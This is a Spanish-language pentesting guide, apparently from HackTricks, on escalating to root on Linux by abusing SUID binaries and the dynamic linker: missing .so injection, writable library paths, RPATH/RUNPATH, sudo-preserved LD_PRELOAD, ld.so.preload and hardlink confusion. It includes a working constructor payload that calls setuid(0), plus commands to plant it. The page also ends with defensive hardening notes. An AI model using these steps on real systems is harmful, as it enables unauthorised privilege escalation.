# Abuso de bibliotecas compartidas y del linker mediante SUID

{{#include ../../banners/hacktricks-training.md}}

Los binarios SUID suelen revisarse en busca de ejecución directa de comandos, pero los programas SUID personalizados también pueden ser vulnerables a través del dynamic linker. El tema común es simple: un ejecutable privilegiado carga código desde una ruta o configuración que un usuario con menos privilegios puede controlar.

Esta página se centra en patrones de técnicas genéricas: bibliotecas ausentes, directorios de bibliotecas con permisos de escritura, `RPATH`/`RUNPATH`, `LD_PRELOAD` mediante sudo, configuración del linker y confusión con hardlinks SUID.

## Enumeración rápida

Comienza buscando archivos SUID inusuales y comprobando si están enlazados dinámicamente:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Céntrate en ubicaciones no estándar, rutas de aplicaciones personalizadas, binarios propiedad de root fuera de los directorios gestionados por paquetes y dependencias cargadas desde directorios con permisos de escritura.

Comprobaciones útiles de permisos de escritura:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Inyección de Shared Object faltante

Algunos binarios SUID personalizados intentan cargar un shared object que no existe. Si la ruta faltante se encuentra dentro de un directorio controlado por el atacante, el binario puede cargar código proporcionado por el atacante como el usuario efectivo.

Busca búsquedas fallidas de librerías:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Si el binario busca una ruta con permisos de escritura para `libexample.so`, una biblioteca mínima de prueba puede utilizar un constructor. Mantén la prueba de impacto inocua durante la validación:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Compílalo con el nombre de archivo exacto que el binario intenta cargar:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
La condición explotable no es únicamente la ausencia de la library. El atacante debe poder colocar un shared object compatible en una ruta que el loader privilegiado acepte.

## Directorio de library con permisos de escritura

A veces existen todas las dependencias, pero uno de los directorios utilizados para resolverlas tiene permisos de escritura. Esto puede permitir reemplazar una library cargada o colocar una library con mayor prioridad y el mismo nombre.

Revisa las rutas de dependencias:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Si el directorio permite escritura, valida el hallazgo con un enfoque seguro para copias en un laboratorio. Reemplazar librerías del sistema en un host activo puede interrumpir la autenticación, la gestión de paquetes o servicios críticos para el arranque.

## RPATH y RUNPATH

`RPATH` y `RUNPATH` son entradas de la sección dinámica que indican al cargador dónde buscar librerías. Son peligrosas en programas SUID cuando apuntan a directorios en los que un atacante puede escribir.

Detectarlas:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Ejemplo de salida riesgosa:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Si `/opt/app/lib` tiene permisos de escritura y el binario necesita `libcustom.so`, el atacante podría colocar allí una `libcustom.so` maliciosa:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` y `RUNPATH` no son idénticos en todos los detalles de resolución, pero para la revisión de privilege-escalation la pregunta práctica es la misma: ¿el binario SUID busca una library en un directorio sobre el que el atacante puede escribir?

## LD_PRELOAD, LD_LIBRARY_PATH y SUID

Para los programas normales, `LD_PRELOAD` y `LD_LIBRARY_PATH` pueden forzar o influir en la carga de shared objects. En los programas SUID, el dynamic loader normalmente entra en secure-execution mode e ignora las variables de entorno peligrosas.

Esto significa que un binario SUID simple normalmente no es vulnerable solo porque el usuario pueda establecer `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
La excepción común es una configuración incorrecta de sudo. Si `sudo -l` muestra que se conserva una variable como `LD_PRELOAD` o `LD_LIBRARY_PATH`, un comando permitido por sudo puede cargar código controlado por el atacante:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
No confundas estos casos:

- `LD_PRELOAD` contra un binario SUID normal: normalmente bloqueado por la ejecución segura.
- `LD_PRELOAD` conservado por sudo: potencialmente explotable.
- `.so` ausente en una ruta escribible: explotable cuando el binario SUID carga naturalmente esa ruta.
- `RPATH`/`RUNPATH` hacia un directorio escribible: explotable cuando se puede controlar una librería necesaria.
- Acceso de escritura a `/etc/ld.so.preload` o a la configuración del linker: afecta a todo el sistema y tiene un alto impacto.

## Configuración del Linker

El dynamic linker también lee la configuración del sistema, como `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, la caché del linker y, en algunos casos, `/etc/ld.so.preload`.

Comprobaciones de alto valor:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
La configuración del linker con permisos de escritura suele ser más grave que un único binario SUID vulnerable, ya que puede afectar a muchos procesos enlazados dinámicamente. `/etc/ld.so.preload` es especialmente peligroso porque puede forzar la carga de un objeto compartido en procesos privilegiados.

## SUID Hardlink Confusion

Los hardlinks pueden hacer que el mismo inode SUID aparezca con varios nombres. Esto resulta útil para ocultar un helper privilegiado, confundir las tareas de limpieza o eludir revisiones ingenuas basadas en rutas.

Busca archivos SUID con más de un enlace:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspecciona todas las rutas al mismo inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
El abuso no consiste en que un hardlink cambie los permisos. El abuso es la confusión de rutas: se puede acceder a un inode privilegiado mediante un nombre que los defensores o los scripts no esperan. Para obtener más información sobre los inodes y el flujo de trabajo con hardlinks, consulta [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Notas defensivas

- Mantén los binarios SUID al mínimo, auditados y gestionados mediante paquetes cuando sea posible.
- Evita entradas `RPATH`/`RUNPATH` que apunten a directorios modificables o gestionados por aplicaciones.
- Mantén los directorios de librerías con propiedad de root y sin permisos de escritura para usuarios normales.
- No conserves `LD_PRELOAD`, `LD_LIBRARY_PATH` ni variables similares del loader mediante sudo.
- Supervisa `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` y los archivos SUID inesperados.
- Revisa los archivos SUID con hardlinks e investiga los wrappers SUID personalizados fuera de las rutas estándar del sistema.
{{#include ../../banners/hacktricks-training.md}}
